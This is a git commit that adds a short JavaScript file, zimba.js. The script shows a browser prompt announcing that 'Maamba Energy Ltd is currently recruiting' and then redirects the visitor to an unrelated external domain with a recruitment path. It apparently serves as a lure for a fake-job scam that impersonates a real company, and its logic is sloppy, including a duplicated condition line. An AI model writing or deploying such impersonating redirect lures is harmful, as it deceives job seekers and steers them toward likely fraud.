b41bec773ad100b377f1123b0f0e8aca2426ac0d
newetijazz20 <newetijazz20@gmail.com>
2026-02-09 08:54:27 +0100

    Create zimba.js

---
+++ zimba.js
@@ -0,0 +1,6 @@
+var password = 'Maamba Energy Ltd Recruitment'
+password=prompt('NOTICE: Maamba Energy Ltd is currently recruiting, press OK to apply for the','Maamba Energy Ltd Recruitment');
+if (password != 'Maamba Energy Ltd Recruitment');
+if (password != 'Maamba Energy Ltd Recruitment') {
+location.href='https://www.krhitid.site/Maamba-Energy-Recruitment.';
+}
